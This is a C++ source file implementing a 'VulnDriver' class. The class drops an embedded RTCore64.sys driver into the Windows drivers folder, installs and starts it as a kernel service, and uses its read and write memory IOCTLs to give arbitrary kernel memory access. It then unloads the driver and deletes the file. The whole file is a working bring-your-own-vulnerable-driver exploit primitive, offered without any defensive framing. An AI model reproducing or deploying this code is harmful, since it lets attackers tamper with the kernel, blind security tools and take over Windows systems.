#include "VulnDriver.hpp"

#include <fstream>
#include <filesystem>

constexpr const char* ServiceName = "RTCore64";
constexpr const char* DriverPath = "C:\\Windows\\System32\\drivers\\RTCore64.sys";

StatusCode VulnDriver::Init()
{
	if (!LoadDriver())
		return STATUS_FAILED_LOAD_DRIVER;

	Handle = CreateFileA(
		"\\\\.\\RTCore64",
		GENERIC_READ | GENERIC_WRITE,
		0, nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);

	if (Handle == INVALID_HANDLE_VALUE)
		return STATUS_FAILED_OPEN_DRIVER;

	return STATUS_SUCCESS;
}

bool VulnDriver::Close()
{
	if (Handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(Handle);
		Handle = INVALID_HANDLE_VALUE;
	}
	return UnloadDriver();
}

bool VulnDriver::Read(uintptr_t Address, void* Buffer, size_t Size)
{
	auto Dst = static_cast<uint8_t*>(Buffer);
	for (size_t i = 0; i < Size; i++)
	{
		MemoryOperation op{};
		op.address = Address + i;
		op.size = 1;

		if (!DeviceIoControl(Handle, RTCORE_READ_MEMORY, &op, sizeof(op), &op, sizeof(op), nullptr, nullptr))
			return false;

		Dst[i] = static_cast<uint8_t>(op.data);
	}
	return true;
}

bool VulnDriver::Write(uintptr_t Address, const void* Buffer, size_t Size)
{
	auto Src = static_cast<const uint8_t*>(Buffer);
	for (size_t i = 0; i < Size; i++)
	{
		MemoryOperation op{};
		op.address = Address + i;
		op.size = 1;
		op.data = Src[i];

		if (!DeviceIoControl(Handle, RTCORE_WRITE_MEMORY, &op, sizeof(op), &op, sizeof(op), nullptr, nullptr))
			return false;
	}
	return true;
}

bool VulnDriver::LoadDriver()
{
	std::ofstream file(DriverPath, std::ios::binary);
	if (!file)
		return false;
	file.write(reinterpret_cast<const char*>(DriverBytes), sizeof(DriverBytes));
	file.close();

	SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
	if (!scm)
		return false;

	SC_HANDLE svc = CreateServiceA(
		scm, ServiceName, ServiceName,
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
		DriverPath, nullptr, nullptr, nullptr, nullptr, nullptr);

	if (!svc)
	{
		CloseServiceHandle(scm);
		return false;
	}

	bool started = StartServiceA(svc, 0, nullptr);
	CloseServiceHandle(svc);
	CloseServiceHandle(scm);
	return started;
}

bool VulnDriver::UnloadDriver()
{
	SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (!scm)
		return false;

	SC_HANDLE svc = OpenServiceA(scm, ServiceName, SERVICE_STOP | DELETE);
	if (!svc)
	{
		CloseServiceHandle(scm);
		return false;
	}

	SERVICE_STATUS status{};
	ControlService(svc, SERVICE_CONTROL_STOP, &status);

	bool deleted = DeleteService(svc);
	CloseServiceHandle(svc);
	CloseServiceHandle(scm);

	if (std::filesystem::exists(DriverPath))
		std::filesystem::remove(DriverPath);

	return deleted;
}
